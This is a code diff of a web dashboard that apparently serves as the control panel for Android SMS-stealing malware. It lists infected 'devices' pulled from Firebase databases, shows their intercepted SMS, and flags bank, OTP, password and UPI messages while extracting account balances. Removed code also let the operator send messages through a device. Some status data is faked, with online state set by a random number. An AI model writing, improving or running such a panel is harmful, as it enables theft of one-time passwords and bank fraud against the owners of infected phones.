-                        memoryCache[dbName] = "EMPTY";
-                        alert("Database is now empty.");
-                        closePanel();
-                    }
-                } else {
-                    memoryCache[dbName] = "ERROR";
-                }
-            } catch (e) {
-                console.error("Refresh failed", e);
-            } finally {
-                if (btn) {
-                    btn.innerHTML = "🔄 Refresh";
-                    btn.disabled = false;
-                }
-            }
         }
 
         function processNode(node, deviceMap, dbName, currentDevice = null, keyName = '') {
@@ -611,7 +690,6 @@
                         number: foundPhone || 'Unknown', 
                         battery: 0,
                         network: 'Unknown', 
-                        android: '-', 
                         isOnline: Math.random() > 0.3,
                         messages: [], bankCount: 0, dbSource: dbName, balance: 0
                     };
@@ -628,11 +706,9 @@
                 if (!time && keyName.length === 13 && /^\d+$/.test(keyName)) {
                     time = parseInt(keyName);
                 }
-                time = time || Date.now();
-
+                
                 let sender = node.sender || node.from || node.app || node.title || 'Unknown';
                 let isBank = /bank|otp|pass|debit|credit|acct|account/i.test(msgText);
-                let isUpi = /upi|gpay|paytm|phonepe|bhim/i.test(msgText);
                 
                 if (isBank) {
                     const amtMatch = msgText.match(/(?:rs\.?|inr)\s*([\d,]+\.?\d*)/i);
@@ -648,10 +724,9 @@
                     currentDevice.messages.push({
                         sender: sender, 
                         time: formatTime(time), 
-                        rawTime: time, 
+                        rawTime: time || 0, 
                         text: msgText, 
-                        isBank: isBank, 
-                        isUpi: isUpi
+                        isBank: isBank
                     });
                 }
             }
@@ -678,9 +753,6 @@
                     if (kl.includes('net') || kl.includes('op') || kl.includes('sim') || kl.includes('car') || /^(jio|airtel|vi|vodafone|idea|bsnl|reliance)$/i.test(vs)) {
                         if (/jio|airtel|vi|vodafone|idea|bsnl|reliance/i.test(vs)) device.network = vs;
                     }
-                    if (kl.includes('android') || kl.includes('version') || kl.includes('os') || kl === 'sdk') {
-                        if (vs.length < 15) device.android = vs;
-                    }
                 } else if (typeof val === 'object' && val !== null) {
                     scanDeviceDetails(val, device);
                 }
@@ -690,29 +762,25 @@
         function renderUI(devicesToRender) {
             const grid = document.getElementById('deviceGrid');
             
-            // Don't overwrite if showing empty/error state for single DB
             if (devicesToRender.length === 0) {
                 if (currentDbFilter === 'ALL') {
-                    grid.innerHTML = '<div class="empty-state">No valid devices found across all databases.</div>';
+                    grid.innerHTML = '<div class="empty-state">No valid devices found.</div>';
                 }
-                // For single DB, it's already handled in fetchData
                 return;
             }
             
             grid.innerHTML = '';
 
-            let onlineCount = 0, offlineCount = 0, bankSmsTotal = 0, cardCount = 0;
+            let onlineCount = 0, offlineCount = 0, bankSmsTotal = 0;
             allDevices.forEach(d => {
                 if (d.isOnline) onlineCount++; else offlineCount++;
                 bankSmsTotal += d.bankCount;
-                if(d.balance > 0) cardCount++;
             });
 
             document.getElementById('stat-total').innerText = allDevices.length;
             document.getElementById('stat-online').innerText = onlineCount;
             document.getElementById('stat-offline').innerText = offlineCount;
             document.getElementById('stat-bank').innerText = bankSmsTotal;
-            document.getElementById('stat-cards').innerText = cardCount;
 
             devicesToRender.forEach(device => {
                 let battColor = 'var(--accent-green)';
@@ -723,18 +791,6 @@
                 card.className = 'device-card';
                 card.onclick = () => openPanel(device);
 
-                let balanceHtml = '';
-                if (device.balance > 0) {
-                    balanceHtml = `
-                    <div class="balance-box">
-                        <div>
-                            <div class="bank-name">🏦 ACCOUNT</div>
-                            <div style="font-size:0.65rem; color:var(--text-muted); margin-top:2px;">Last Balance</div>
-                        </div>
-                        <div class="amount">₹${device.balance.toLocaleString('en-IN')}</div>
-                    </div>`;
-                }
-
                 card.innerHTML = `
                     <div class="card-header">
                         <div class="device-id" title="${device.id}"><span class="wifi-icon">📶</span> ${formatPhone(device.id)}</div>
@@ -742,28 +798,32 @@
                     </div>
                     <div class="card-row">
                         <div class="data-col">
-                            <span class="data-label">Android</span>
-                            <span class="data-val">${device.android}</span>
-                        </div>
-                        <div class="data-col" style="align-items: flex-end;">
                             <span class="data-label">Battery</span>
                             <div class="battery-indicator">
                                 <div class="batt-bar"><div class="batt-fill" style="width: ${device.battery}%; background: ${battColor}"></div></div>
                                 <span style="color:${battColor}">${device.battery}%</span>
                             </div>
                         </div>
+                        <div class="data-col" style="align-items: flex-end;">
+                            <span class="data-label">Network</span>
+                            <span class="data-val">${device.network}</span>
+                        </div>
                     </div>
                     <div class="card-row">
                         <div class="data-col">
                             <span class="data-label">Number</span>
-                            <span class="data-val">${formatPhone(device.number)}</span>
+                            <span class="data-val">
+                                ${formatPhone(device.number)}
+                                <button class="copy-btn" onclick="event.stopPropagation(); copyText('${device.number}')" title="Copy Number">
+                                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                                </button>
+                            </span>
                         </div>
                         <div class="data-col" style="align-items: flex-end;">
-                            <span class="data-label">Network</span>
-                            <span class="data-val" style="color: ${device.network !== 'Unknown' ? 'var(--text-main)' : 'var(--text-muted)'}">${device.network}</span>
+                            <span class="data-label">SMS</span>
+                            <span class="data-val">${device.messages.length}</span>
                         </div>
                     </div>
-                    ${balanceHtml}
                     <div class="card-footer">
                         <div class="dot" style="background: ${device.isOnline ? 'var(--accent-green)' : 'var(--text-muted)'}"></div>
                         <span class="status-text ${device.isOnline ? 'online' : 'offline'}">${device.isOnline ? 'Online' : 'Offline'}</span>
@@ -775,7 +835,7 @@
 
         function applyFilters() {
             const query = document.getElementById('searchInput').value.toLowerCase();
-            let filtered = allDevices.filter(d => d.number.toLowerCase().includes(query) || d.id.toLowerCase().includes(query));
+            let filtered = allDevices.filter(d => d.number.toLowerCase().includes(query) || d.id.toLowerCase().includes(query) || d.dbSource.toLowerCase().includes(query));
             
             if (currentDbFilter !== 'ALL') {
                 filtered = filtered.filter(d => d.dbSource === currentDbFilter);
@@ -784,15 +844,7 @@
             if (currentFilter === 'Online') filtered = filtered.filter(d => d.isOnline);
             else if (currentFilter === 'Offline') filtered = filtered.filter(d => !d.isOnline);
             else if (currentFilter === 'Bank') filtered = filtered.filter(d => d.bankCount > 0);
-            else if (currentFilter === 'Upi') filtered = filtered.filter(d => d.messages.some(m => m.isUpi));
-            else if (currentFilter === 'Card') filtered = filtered.filter(d => d.balance > 0);
-
-            const sortVal = document.getElementById('sortSelect').value;
-            filtered.sort((a, b) => {
-                let timeA = a.messages.length ? Math.max(...a.messages.map(m => m.rawTime)) : 0;
-                let timeB = b.messages.length ? Math.max(...b.messages.map(m => m.rawTime)) : 0;
-                return sortVal === 'newest' ? timeB - timeA : timeA - timeB;
-            });
+            else if (currentFilter === 'Trusted') filtered = filtered.filter(d => d.isOnline && d.battery > 0); // Trusted Logic
 
             renderUI(filtered);
         }
@@ -800,9 +852,6 @@
         function setDbFilter(val) {
             currentDbFilter = val;
             allDevices = [];
-            document.getElementById('stat-total').innerText = "0";
-            document.getElementById('stat-online').innerText = "0";
-            document.getElementById('stat-offline').innerText = "0";
             fetchData();
         }
 
@@ -816,7 +865,12 @@
         function openPanel(device) {
             activeDevice = device;
             document.getElementById('panel-device-id').innerText = formatPhone(device.id);
-            document.getElementById('panel-device-number').innerText = formatPhone(device.number);
+            document.getElementById('panel-device-number').innerHTML = `
+                ${formatPhone(device.number)}
+                <button class="copy-btn" onclick="copyText('${device.number}')" title="Copy Number" style="margin-left:5px;">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                </button>
+            `;
             document.getElementById('panel-batt').innerText = device.battery + "%";
             document.getElementById('overlay').classList.add('active');
             document.getElementById('sidePanel').classList.add('active');
@@ -848,32 +902,16 @@
                     <div class="info-row"><span class="info-label">Network</span><span style="font-weight:600">${activeDevice.network}</span></div>
                     <div class="info-row"><span class="info-label">Database</span><span style="font-weight:600">${activeDevice.dbSource}</span></div>
                 `;
-            } else if (tab === 'send') {
-                content.innerHTML = `
-                    <div style="display:flex; flex-direction:column; gap:10px;">
-                        <p style="font-size:0.8rem; color:var(--text-muted);">Send message to ${formatPhone(activeDevice.number)} (Requires write access)</p>
-                        <textarea id="smsText" style="background:#18181b; border:1px solid var(--border-color); padding:12px; border-radius:8px; color:white; resize:none; height:100px; font-family:inherit;" placeholder="Type your message here..."></textarea>
-                        <button onclick="sendSMS()" style="background:var(--accent-blue); color:white; border:none; padding:12px; border-radius:8px; cursor:pointer; font-weight:600;">Send Message 🚀</button>
-                        <div id="send-status" style="font-size:0.8rem; margin-top:5px;"></div>
-                    </div>
-                `;
             } else {
                 let msgsToShow = tab === 'bank' ? activeDevice.messages.filter(m => m.isBank) : activeDevice.messages;
                 msgsToShow.sort((a,b) => (b.rawTime || 0) - (a.rawTime || 0));
 
                 if (msgsToShow.length === 0) {
-                    content.innerHTML = `<div class="empty-state">No messages found.<br><br>
-                        <button id="panelRefreshBtn" onclick="refreshActiveDevice()" style="background:transparent; border:1px solid var(--border-color); color:var(--text-main); padding:6px 12px; border-radius:6px; cursor:pointer;">🔄 Refresh</button>
-                    </div>`;
+                    content.innerHTML = `<div class="empty-state">No messages found.</div>`;
                 } else {
-                    content.innerHTML = `<div style="font-size:0.75rem; color:var(--text-muted); margin-bottom:15px; display:flex; justify-content:space-between; align-items:center; padding:0 5px;">
-                        <span>Last 60 messages · auto-refreshes</span>
-                        <button id="panelRefreshBtn" onclick="refreshActiveDevice()" style="background:transparent; border:1px solid var(--border-color); color:var(--text-main); padding:4px 8px; border-radius:4px; cursor:pointer; font-size:0.75rem; display:flex; align-items:center; gap:4px;">
-                            🔄 Refresh
-                        </button>
-                    </div>`;
+                    content.innerHTML = `<div style="font-size:0.75rem; color:var(--text-muted); margin-bottom:15px;">Last messages · auto-refreshes</div>`;
                     
-                    msgsToShow.forEach(msg => {
+                    msgsToShow.forEach((msg, idx) => {
                         const senderClass = msg.isBank ? 'bank-sender' : '';
                         const itemClass = msg.isBank ? 'bank' : '';
                         content.innerHTML += `
@@ -883,30 +921,13 @@
                                     <span class="sms-time">${msg.time}</span>
                                 </div>
                                 <div class="sms-body">${msg.text}</div>
+                                <button class="copy-btn" style="position:absolute; bottom:10px; right:10px;" onclick="copyText('${msg.text.replace(/'/g, "\\'").replace(/"/g, '\\"')}')" title="Copy Message">
+                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                                </button>
                             </div>
                         `;
                     });
                 }
-            }
-        }
-
-        async function sendSMS() {
-            const text = document.getElementById('smsText').value;
-            if(!text) return;
-            const statusDiv = document.getElementById('send-status');
-            statusDiv.innerHTML = "⏳ Sending...";
-            const dbUrl = databases[activeDevice.dbSource];
-            try {
-                const res = await fetch(`${dbUrl}/sent_messages.json`, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ to: activeDevice.number, message: text, timestamp: Date.now() })
-                });
-                if(res.ok) {
-                    statusDiv.innerHTML = "<span style='color:var(--accent-green)'>✅ Message saved to DB!</span>";
-                    document.getElementById('smsText').value = '';
-                } else throw new Error("Permission denied");
-            } catch (e) {
-                statusDiv.innerHTML = `<span style="color:var(--accent-red)">❌ Failed: Database write permission denied.</span>`;
             }
         }
 
@@ -916,14 +937,14 @@
         }
 
         function openModal() {
-            document.getElementById('addModal').classList.add('active');
+            document.getElementById('addModal').style.display = 'block';
             document.getElementById('overlay').classList.add('active');
             document.getElementById('modal-status').style.display = 'none';
             document.getElementById('newFirebaseUrl').value = '';
         }
 
         function closeModal() {
-            document.getElementById('addModal').classList.remove('active');
+            document.getElementById('addModal').style.display = 'none';
             document.getElementById('overlay').classList.remove('active');
         }
 
@@ -972,6 +993,7 @@
             }
         }
 
+        // Init
         initDropdown();
         fetchData();
     </script>
